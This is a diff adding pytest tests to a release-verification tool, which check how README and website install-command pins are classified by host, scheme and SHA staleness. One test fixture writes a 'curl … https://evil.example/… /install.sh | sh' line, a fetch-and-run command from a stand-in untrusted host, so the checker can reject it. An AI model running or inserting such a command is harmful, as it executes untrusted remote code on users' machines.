@@ -7585,6 +7585,173 @@ def test_phase11_verify_readme_pin_rejects_lookalike_host_suffix(
     assert "trusted" in out
 
 
+def test_phase11_verify_readme_pin_fails_for_uppercase_scheme_stale_sha(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A README pin using an uppercase HTTPS:// scheme is still classified
+    and its currency checked — not silently skipped.
+
+    Regression for the case-sensitive candidate filter: a filter requiring
+    a literal lowercase "https://" would miss "HTTPS://" entirely,
+    producing zero checks (worse than "untrusted") — a stale SHA pinned
+    this way would silently escape detection rather than being classified
+    as trusted-but-stale.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    stale_sha = _git_out(["rev-list", "--max-parents=0", "HEAD"], cwd=d)
+    (root / "README.md").write_text(
+        "# proj\n\ncurl -fsSL "
+        f"HTTPS://raw.githubusercontent.com/punt-labs/proj/{stale_sha}"
+        "/install.sh | sh\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "pin readme with uppercase scheme"], cwd=d)
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ README pin" in out
+    assert "stale" in out
+
+
+def test_phase11_verify_website_sha_fails_for_http_scheme(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A trusted host pinned over plain http:// (not https://) fails as
+    untrusted — the scheme is part of the trust boundary, not just the
+    host, and the candidate filter must not miss http:// URLs either.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    projects = [
+        {
+            "id": "proj",
+            "version": version,
+            "githubUrl": "https://github.com/punt-labs/proj",
+            "installCommand": (
+                "curl -fsSL http://raw.githubusercontent.com/punt-labs/proj/"
+                f"{install_sha}/install.sh | sh"
+            ),
+        }
+    ]
+    _make_sibling(
+        tmp_path,
+        "public-website",
+        {"src/data/projects.json": json.dumps(projects, indent=2) + "\n"},
+    )
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ website SHA" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_readme_pin_fails_for_non_sha_downgrade_on_untrusted_host(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A version-tag (non-SHA) install URL on an untrusted host that still
+    references this project fails — not silently ignored just because it
+    doesn't look like a SHA pin.
+
+    Regression: neither the trusted-prefix check nor a bare SHA-shape
+    check alone catches https://evil.example/<owner>/<repo>/v1.2.3/
+    install.sh — it matches neither, so it was invisible to both
+    branches. A SHA-pin -> version-tag downgrade onto any host must still
+    be caught, or it would evade the check entirely by no longer looking
+    like a SHA.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    (root / "README.md").write_text(
+        "# proj\n\ncurl -fsSL "
+        "https://evil.example/punt-labs/proj/v1.2.3/install.sh | sh\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "pin readme to an untrusted version-tag url"], cwd=d)
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ README pin" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_readme_pin_skips_legit_trusted_version_tag(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A version-tag install URL on the genuinely trusted host/owner/repo
+    is skipped cleanly — it isn't a SHA pin, so there is nothing to check
+    for staleness, even though the host IS validated.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    (root / "README.md").write_text(
+        "# proj\n\ncurl -fsSL "
+        "https://raw.githubusercontent.com/punt-labs/proj/v1.2.3"
+        "/install.sh | sh\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "pin readme to a legit trusted version-tag url"], cwd=d)
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    _phase11_verify(info, version, dry_run=False)  # must not raise
+
+    out = capsys.readouterr().out
+    assert "README pin" not in out
+
+
+def test_phase11_verify_readme_pin_ignores_unrelated_tool_url(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """An install.sh URL for a completely different owner/repo is ignored
+    — not our concern, and must not produce a false-positive failure.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    (root / "README.md").write_text(
+        "# proj\n\nSee also "
+        "https://raw.githubusercontent.com/other-org/other-tool/v1.0.0"
+        "/install.sh for a related project.\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "mention an unrelated tool's install url"], cwd=d)
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    _phase11_verify(info, version, dry_run=False)  # must not raise
+
+    out = capsys.readouterr().out
+    assert "README pin" not in out
+
+
 # --- Phase 11: matches_install_sha() commit-identity resolution ---
 
 
